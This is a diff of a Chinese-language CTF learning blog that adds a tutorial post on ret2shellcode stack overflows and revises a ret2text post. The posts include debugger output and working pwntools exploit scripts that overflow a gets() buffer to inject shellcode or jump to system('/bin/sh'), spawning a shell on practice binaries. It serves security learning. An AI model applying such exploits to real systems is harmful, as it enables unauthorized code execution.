@@ -145,6 +145,105 @@
   
   
   <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
+    <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/05/31/%E4%BB%8Eret2shellcode%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/avatar.gif">
+      <meta itemprop="name" content="s0nnse">
+      <meta itemprop="description" content="">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="s0nnse">
+    </span>
+      <header class="post-header">
+        <h2 class="post-title" itemprop="name headline">
+          
+            <a href="/2020/05/31/%E4%BB%8Eret2shellcode%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/" class="post-title-link" itemprop="url">从ret2shellcode入坑栈溢出</a>
+        </h2>
+
+        <div class="post-meta">
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="far fa-calendar"></i>
+              </span>
+              <span class="post-meta-item-text">Posted on</span>
+              
+
+              <time title="Created: 2020-05-31 20:12:30 / Modified: 21:31:26" itemprop="dateCreated datePublished" datetime="2020-05-31T20:12:30+08:00">2020-05-31</time>
+            </span>
+
+          
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+          <h4 id="ret2shellcode原理"><a href="#ret2shellcode原理" class="headerlink" title="ret2shellcode原理"></a>ret2shellcode原理</h4><p>ret2shellcode，即控制程序执行 shellcode 代码。shellcode 指的是用于完成某个功能的汇编代码，常见的功能主要是获取目标系统的 shell。一般来说，shellcode 需要我们自己填充。这其实是另外一种典型的利用方法，即此时我们需要自己去填充一些可执行的代码。</p>
+<p>在栈溢出的基础上，要想执行 shellcode，需要对应的 binary 在运行时，shellcode 所在的区域具有可执行权限。</p>
+<p>栈溢出的基本概念在ret2text中介绍过，这里不再重复，直接分析一个程序。</p>
+<h4 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h4><p>以<a href="https://ctf-wiki.github.io/ctf-wiki/pwn/readme-zh/" target="_blank" rel="noopener">ctf-wiki</a>中的ret2shellcode程序为例，主要内容与ctf-wiki一致，其中穿插补充一些学习中所遇到的疑惑点。</p>
+<p>首先常规的先检测程序开启的保护</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN$ checksec --file=ret2shellcode</span><br><span class="line">[*] '/home/kali/PWN/ret2shellcode'</span><br><span class="line">    Arch:     i386-32-little</span><br><span class="line">    RELRO:    Partial RELRO</span><br><span class="line">    Stack:    No canary found</span><br><span class="line">    NX:       NX disabled</span><br><span class="line">    PIE:      No PIE (0x8048000)</span><br><span class="line">    RWX:      Has RWX segments</span><br></pre></td></tr></table></figure>
+
+<p>可以看到是一个32位程序，而且几乎没有开启任何保护，丢进IDA看一下。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(<span class="built_in">stdin</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"No system for you this time !!!"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">strncpy</span>(buf2, &amp;s, <span class="number">0x64</span>u);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"bye bye ~"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>简单查看，可以看到输入数据读到s变量中，再复制到buf2处，这里因为代码里没有自带的system等获取shell的函数，所以不能使用ret2text，需要自己写入调用的函数。</p>
+<p>这里先引入一下内存分配区域的知识</p>
+<p>32位操作系统下为：1G内核态，3G用户态</p>
+<p>BSS段 ：通常是指用来存放程序中未初始化的全局变量、静态变量（全局变量未初始化时默认为0）的一块内存区域</p>
+<p>数据段（data） ：通常是指用来存放程序中 初始化后的全局变量和静态变量</p>
+<p>代码段（text） ：通常是指用来存放程序中 代码和常量</p>
+<p>堆（heap） ：通常是指用来存放程序中进程运行时被动态分配的内存段 ( 动态分配：malloc / new，者动态释放：free / delete)</p>
+<p>栈 （stack）：通常是指用来存放程序中用户临时创建的局部变量、函数形参、数组（局部变量未初始化则默认为垃圾值）也就是说我们函数括弧“{}”中定义的变量（但不包括static声明的变量，static意味着在数据段中存放变量）。除此以外，在函数被调用时，其参数也会被压入发起调用的进程栈中，并且待调用结束后，函数的返回值也会被存放回栈中。由于栈的先进后出特点，所以栈特别方便用来保存/恢复调用现场。从这个意义上讲，我们可以把堆栈看成一个寄存、交换临时数据的内存区。它是由操作系统分配的，内存的申请与回收都由OS管理。</p>
+<p>这里有个疑惑，s变量读入了数据，为什么不把shellcode直接写入s变量所在的空间执行，反而要多走一步到bss段再执行。首先变量s是保存在栈中的，而且NX disabled栈保护是关闭的。<strong>未知，留坑。</strong></p>
+<p>接下来在IDA中通过双击buf2，查看buf2的信息。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.bss:0804A080 ; char buf2[100]</span><br><span class="line">.bss:0804A080 buf2            db 64h dup(?)           ; DATA XREF: main+7B↑o</span><br><span class="line">.bss:0804A080 _bss            ends</span><br></pre></td></tr></table></figure>
+
+<p>查看可知buf2在bss段，有100个字节空间长度，在解释一下<code>db 64h dup(?)</code>的含义。</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">db： 定义字节类型变量的伪指令</span><br><span class="line">dup()： 重复定义圆括号中指定的初值，次数由前面的数值决定</span><br><span class="line">?： 只分配存储空间，不指定初值</span><br></pre></td></tr></table></figure>
+
+<p>接下来简单调试下程序，看看这里的bss段是否可以执行。</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br></pre></td><td class="code"><pre><span class="line">pwndbg: loaded 192 commands. Type pwndbg [filter] for a list.</span><br><span class="line">pwndbg: created $rebase, $ida gdb functions (can be used with print/break)</span><br><span class="line">Reading symbols from ret2shellcode...</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> b main</span></span><br><span class="line">Breakpoint 1 at 0x8048536: file ret2shellcode.c, line 8.</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> r</span></span><br><span class="line">Starting program: /home/kali/PWN/ret2shellcode </span><br><span class="line"></span><br><span class="line">Breakpoint 1, main () at ret2shellcode.c:8</span><br><span class="line">8       ret2shellcode.c: No such file or directory.</span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line">────────────────────────────────────[ REGISTERS ]─────────────────────────────────────</span><br><span class="line"> EAX  0xf7fb6808 (environ) —▸ 0xffffd39c —▸ 0xffffd531 ◂— 'SHELL=/bin/bash'</span><br><span class="line"> EBX  0x0</span><br><span class="line"> ECX  0x4e9a5ff3</span><br><span class="line"> EDX  0xffffd324 ◂— 0x0</span><br><span class="line"> EDI  0xf7fb4000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */</span><br><span class="line"> ESI  0xf7fb4000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */</span><br><span class="line"> EBP  0xffffd2f8 ◂— 0x0</span><br><span class="line"> ESP  0xffffd270 —▸ 0xf7f5bc92 ◂— pop    edi /* '__vdso_clock_gettime' */</span><br><span class="line"> EIP  0x8048536 (main+9) ◂— mov    eax, dword ptr [0x804a060]</span><br><span class="line">──────────────────────────────────────[ DISASM ]──────────────────────────────────────</span><br><span class="line"> ► 0x8048536 &lt;main+9&gt;     mov    eax, dword ptr [0x804a060]</span><br><span class="line">    ↓</span><br><span class="line">   0x8048543 &lt;main+22&gt;    mov    dword ptr [esp + 8], 2</span><br><span class="line">   0x804854b &lt;main+30&gt;    mov    dword ptr [esp + 4], 0</span><br><span class="line">   0x8048553 &lt;main+38&gt;    mov    dword ptr [esp], eax</span><br><span class="line">   0x8048556 &lt;main+41&gt;    call   setvbuf@plt &lt;0x8048410&gt;</span><br><span class="line"> </span><br><span class="line">   0x804855b &lt;main+46&gt;    mov    eax, dword ptr [stdin@@GLIBC_2.0] &lt;0x804a040&gt;</span><br><span class="line">   0x8048560 &lt;main+51&gt;    mov    dword ptr [esp + 0xc], 0</span><br><span class="line">   0x8048568 &lt;main+59&gt;    mov    dword ptr [esp + 8], 1</span><br><span class="line">   0x8048570 &lt;main+67&gt;    mov    dword ptr [esp + 4], 0</span><br><span class="line">   0x8048578 &lt;main+75&gt;    mov    dword ptr [esp], eax</span><br><span class="line">   0x804857b &lt;main+78&gt;    call   setvbuf@plt &lt;0x8048410&gt;</span><br><span class="line">──────────────────────────────────────[ STACK ]───────────────────────────────────────</span><br><span class="line">00:0000│ esp  0xffffd270 —▸ 0xf7f5bc92 ◂— pop    edi /* '__vdso_clock_gettime' */</span><br><span class="line">01:0004│      0xffffd274 —▸ 0xf7ffdc40 —▸ 0xf7fd3000 ◂— jg     0xf7fd3047</span><br><span class="line">02:0008│      0xffffd278 —▸ 0xffffd298 —▸ 0xf7fb4000 ◂— insb   byte ptr es:[edi], dx /* 0x1dfd6c */</span><br><span class="line">03:000c│      0xffffd27c —▸ 0xf7ffde14 —▸ 0xf7ffdda0 —▸ 0xf7ffdc54 —▸ 0xf7ffdc40 ◂— ...</span><br><span class="line">04:0010│      0xffffd280 —▸ 0xffffd2d0 ◂— 0x1</span><br><span class="line">05:0014│      0xffffd284 ◂— 0x0</span><br><span class="line">06:0018│      0xffffd288 —▸ 0xf7ffd000 ◂— and    al, 0x8f /* 0x28f24 */</span><br><span class="line">07:001c│      0xffffd28c ◂— 0x0</span><br><span class="line">────────────────────────────────────[ BACKTRACE ]─────────────────────────────────────</span><br><span class="line"> ► f 0  8048536 main+9</span><br><span class="line">   f 1 f7df2ef1 __libc_start_main+241</span><br><span class="line">──────────────────────────────────────────────────────────────────────────────────────</span><br><span class="line"><span class="meta">pwndbg&gt;</span><span class="bash"> vmmap</span></span><br><span class="line">LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA</span><br><span class="line"> 0x8048000  0x8049000 r-xp     1000 0      /home/kali/PWN/ret2shellcode</span><br><span class="line"> 0x8049000  0x804a000 r-xp     1000 0      /home/kali/PWN/ret2shellcode</span><br><span class="line"> 0x804a000  0x804b000 rwxp     1000 1000   /home/kali/PWN/ret2shellcode</span><br><span class="line">0xf7dd4000 0xf7fb2000 r-xp   1de000 0      /usr/lib32/libc-2.30.so</span><br><span class="line">0xf7fb2000 0xf7fb4000 r-xp     2000 1dd000 /usr/lib32/libc-2.30.so</span><br><span class="line">0xf7fb4000 0xf7fb6000 rwxp     2000 1df000 /usr/lib32/libc-2.30.so</span><br><span class="line">0xf7fb6000 0xf7fb8000 rwxp     2000 0      </span><br><span class="line">0xf7fce000 0xf7fd0000 rwxp     2000 0      </span><br><span class="line">0xf7fd0000 0xf7fd3000 r--p     3000 0      [vvar]</span><br><span class="line">0xf7fd3000 0xf7fd4000 r-xp     1000 0      [vdso]</span><br><span class="line">0xf7fd4000 0xf7ffc000 r-xp    28000 0      /usr/lib32/ld-2.30.so</span><br><span class="line">0xf7ffc000 0xf7ffd000 r-xp     1000 27000  /usr/lib32/ld-2.30.so</span><br><span class="line">0xf7ffd000 0xf7ffe000 rwxp     1000 28000  /usr/lib32/ld-2.30.so</span><br><span class="line">0xfffdd000 0xffffe000 rwxp    21000 0      [stack]</span><br></pre></td></tr></table></figure>
+
+<p>在main函数处下断点，通过vmmap<code>#查看进程中的权限</code>。</p>
+<p>buf2地址为0x0804A080，落在</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0x804a000  0x804b000 rwxp     1000 1000   /home/kali/PWN/ret2shellcode</span><br></pre></td></tr></table></figure>
+
+<p>中，所以可以看到bss段具有可执行的权限</p>
+<p>那么这次我们就控制程序执行 shellcode，也就是读入 shellcode，然后控制程序执行 bss 段处的 shellcode。其中，相应的偏移计算类似于 ret2text 中的例子。需要额外注意的是最后payload的组成应该是<code>payload = shellcode + 垃圾填充字符 + 要跳转地址（这里是bss段shellcode的地址）</code>。这里的buf2地址为0x0804A080，所以最后需要完成覆盖后的返回地址（retaddr）也需要变成0x0804A080。</p>
+<p>编写相应的exp</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">"./ret2shellcode"</span>)</span><br><span class="line">shellcode = asm(shellcraft.sh())</span><br><span class="line">buf2_addr = <span class="number">0x804a080</span></span><br><span class="line">sh.sendline(shellcode.ljust(<span class="number">112</span>, <span class="string">b'A'</span>) + p32(buf2_addr))</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
+
+<p>代码中<code>asm(shellcraft.sh())</code>是生成一个shellcode，<code>shellcode.ljust(112, b&#39;A&#39;)</code>是若生成的shellcode长度若不够112个，则用垃圾字符填充。</p>
+<p>执行代码成功获取shell</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN$ python3 ret2shellcode.py </span><br><span class="line">[+] Starting local process './ret2shellcode': pid 1901</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">No system for you this time !!!</span><br><span class="line">bye bye ~$ ls</span><br><span class="line">pwndbg    ret2shellcode  ret2shellcode.py  ret2text  ret2text.py</span><br></pre></td></tr></table></figure>
+
+
+      
+    </div>
+
+    
+    
+    
+      <footer class="post-footer">
+        <div class="post-eof"></div>
+      </footer>
+  </article>
+  
+  
+  
+
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block" lang="en">
     <link itemprop="mainEntityOfPage" href="https://github.com/s0nnse/2020/05/31/%E4%BB%8Eret2text%E5%85%A5%E5%9D%91%E6%A0%88%E6%BA%A2%E5%87%BA/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -170,7 +269,7 @@
               <span class="post-meta-item-text">Posted on</span>
               
 
-              <time title="Created: 2020-05-31 10:10:06 / Modified: 15:07:28" itemprop="dateCreated datePublished" datetime="2020-05-31T10:10:06+08:00">2020-05-31</time>
+              <time title="Created: 2020-05-31 10:10:06 / Modified: 21:29:20" itemprop="dateCreated datePublished" datetime="2020-05-31T10:10:06+08:00">2020-05-31</time>
             </span>
 
           
@@ -202,7 +301,7 @@
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> __cdecl <span class="title">main</span><span class="params">(<span class="keyword">int</span> argc, <span class="keyword">const</span> <span class="keyword">char</span> **argv, <span class="keyword">const</span> <span class="keyword">char</span> **envp)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br><span class="line"></span><br><span class="line">  setvbuf(<span class="built_in">stdout</span>, <span class="number">0</span>, <span class="number">2</span>, <span class="number">0</span>);</span><br><span class="line">  setvbuf(_bss_start, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">"There is something amazing here, do you know anything?"</span>);</span><br><span class="line">  gets(&amp;s);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">"Maybe I will tell you next time !"</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>查看主函数存在gets函数，明显可以看到存在栈溢出漏洞。</p>
-<p>在secure函数里发现存在调用system(“/bin/sh”)的代码</p>
+<p>在secure函数里发现存在调用<code>system(&quot;/bin/sh&quot;)</code>的代码</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">secure</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">  <span class="keyword">unsigned</span> <span class="keyword">int</span> v0; <span class="comment">// eax</span></span><br><span class="line">  <span class="keyword">int</span> input; <span class="comment">// [esp+18h] [ebp-10h]</span></span><br><span class="line">  <span class="keyword">int</span> secretcode; <span class="comment">// [esp+1Ch] [ebp-Ch]</span></span><br><span class="line"></span><br><span class="line">  v0 = time(<span class="number">0</span>);</span><br><span class="line">  srand(v0);</span><br><span class="line">  secretcode = rand();</span><br><span class="line">  __isoc99_scanf((<span class="keyword">const</span> <span class="keyword">char</span> *)&amp;unk_8048760, &amp;input);</span><br><span class="line">  <span class="keyword">if</span> ( input == secretcode )</span><br><span class="line">    system(<span class="string">"/bin/sh"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
 
 <p>查看system函数的地址</p>
@@ -210,21 +309,26 @@
 
 
 
-<p>那么要PWN这个程序的思路就是通过gets函数输入s的值去覆盖retaddres以执行system(“/bin/sh”)代码获取shell，即返回地址要覆盖为0x0804863A。</p>
+<p>那么要PWN这个程序的思路就是通过gets函数输入s的值去覆盖retaddres以执行<code>system(&quot;/bin/sh&quot;)</code>代码获取shell，即返回地址要覆盖为0x0804863A。</p>
 <p>s存在的是我们输入的数据，要在这里溢出，就需要确定填充长度，主要是计算我们所要操作的地址与我们所要覆盖的地址的距离。常见的操作方法就是打开 IDA，根据其给定的地址计算偏移。</p>
 <p>查看IDA的信息</p>
 <figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">char</span> s; <span class="comment">// [esp+1Ch] [ebp-64h]</span></span><br></pre></td></tr></table></figure>
 
-<p>s变量在内存中的位置距离栈顶+1Ch个字节，距离栈底-64h个字节。这里不能使用[ebp-64h]来进行偏移的计算，因为查看汇编代码可知s是相对于esp的索引，所以s变量的偏移量相对于esp是正确的，而相对于ebp的偏移量是错误的，这就需要通过动态调试来获取偏移量。</p>
+<p>s变量在内存中的位置距离栈顶+1Ch个字节，距离栈底-64h个字节。这里不能使用<code>[ebp-64h]</code>来进行偏移的计算，因为查看汇编代码可知s是相对于esp的索引，所以s变量的偏移量相对于esp是正确的，而相对于ebp的偏移量是错误的，这就需要通过动态调试来获取偏移量。</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:080486A7                 lea     eax, [esp+80h+s]</span><br><span class="line">.text:080486AB                 mov     [esp], eax      ; s</span><br><span class="line">.text:080486AE                 call    _gets</span><br></pre></td></tr></table></figure>
 
-<p>通过gdb进行调试，在call的位置下断点。</p>
+<p>通过gdb进行调试，在call的位置下断点。这里在介绍下常用的几种下断点的方式</p>
+<ul>
+<li>数据断点：根据地址来设置断点，只能是在debug程序运行之后设置，如<code>b *0x400522</code>而获取地址值的方法是，先设置普通断点，在断点处<code>print &amp;变量名</code> 就能获取该变量的地址，如<code>b &amp;变量名</code>。</li>
+<li>函数断点：当程序执行到某个程序时就会触发断点，如<code>b &amp;变量名</code>。</li>
+</ul>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">gef➤  b *0x080486AE</span><br><span class="line">Breakpoint 1 at 0x80486ae: file ret2text.c, line 24.</span><br><span class="line">gef➤  r</span><br><span class="line">There is something amazing here, do you know anything?</span><br><span class="line"></span><br><span class="line">Breakpoint 1, 0x080486ae in main () at ret2text.c:24</span><br><span class="line">24      gets(buf);</span><br><span class="line">───────────────────────────────────────────────────────────────────────[ registers ]────</span><br><span class="line"><span class="meta">$</span><span class="bash">eax   : 0xffffcd5c  →  0x08048329  →  <span class="string">"__libc_start_main"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">ebx   : 0x00000000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">ecx   : 0xffffffff</span></span><br><span class="line"><span class="meta">$</span><span class="bash">edx   : 0xf7faf870  →  0x00000000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">esp   : 0xffffcd40  →  0xffffcd5c  →  0x08048329  →  <span class="string">"__libc_start_main"</span></span></span><br><span class="line"><span class="meta">$</span><span class="bash">ebp   : 0xffffcdc8  →  0x00000000</span></span><br><span class="line"><span class="meta">$</span><span class="bash">esi   : 0xf7fae000  →  0x001b1db0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">edi   : 0xf7fae000  →  0x001b1db0</span></span><br><span class="line"><span class="meta">$</span><span class="bash">eip   : 0x080486ae  →  &lt;main+102&gt; call 0x8048460 &lt;gets@plt&gt;</span></span><br></pre></td></tr></table></figure>
 
-<p>可以看到esp为0xffffcd40，ebp为0xffffcdc8，已知s相对于esp的索引为[esp+1Ch]，那么s的地址为[esp+1Ch]=0xffffcd5c。所以s相对于ebp的偏移量为[s-ebp]=0x6c，因为还有saved ebp的存在，所以s相对于返回（ret）地址的偏移为[0x6c+4]=0x70。</p>
-<p>使用pwntools库编写exp程序，使用python3时，在payload一行注意填充字符时使用b’’填入bytes数据。</p>
+<p>可以看到esp为0xffffcd40，ebp为0xffffcdc8，已知s相对于esp的索引为<code>[esp+1Ch]</code>，那么s的地址为<code>[esp+1Ch]=0xffffcd5c</code>。所以s相对于ebp的偏移量为<code>[s-ebp]=0x6c</code>，因为还有saved ebp的存在，所以s相对于返回（ret）地址的偏移为<code>[0x6c+4]=0x70</code>，+4是因为一个单位栈空间占据4字节。</p>
+<p>使用pwntools库编写exp程序，使用python3时，在payload一行注意填充字符时使用<code>b&#39;&#39;</code>填入bytes数据。</p>
 <figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">sh = process(<span class="string">'./ymjr'</span>)</span><br><span class="line">target = <span class="number">0x804863a</span></span><br><span class="line">payload = <span class="string">b'a'</span>*<span class="number">112</span> + p32(target)</span><br><span class="line">sh.sendline(payload)</span><br><span class="line">sh.interactive()</span><br></pre></td></tr></table></figure>
 
+<p>代码中<code>process(&#39;./ymjr&#39;)</code>是设置需要PWN的对象程序，<code>sh.sendline(payload)</code>发送对应的payload，<code>sh.interactive()</code>是获取交互shell。</p>
 <p>执行exp程序可成功获取shell</p>
 <figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">kali@kali:~/PWN$ python3 ret2text.py </span><br><span class="line">[+] Starting local process './ymjr': pid 8477</span><br><span class="line">[*] Switching to interactive mode</span><br><span class="line">There is something amazing here, do you know anything?</span><br><span class="line">Maybe I will tell you next time !$ ls</span><br><span class="line">core  pwndbg  ret2text.py  ymjr</span><br></pre></td></tr></table></figure>
 
@@ -485,7 +589,7 @@
       <div class="site-state-item site-state-posts">
           <a href="/archives/">
         
-          <span class="site-state-item-count">3</span>
+          <span class="site-state-item-count">4</span>
           <span class="site-state-item-name">posts</span>
         </a>
       </div>
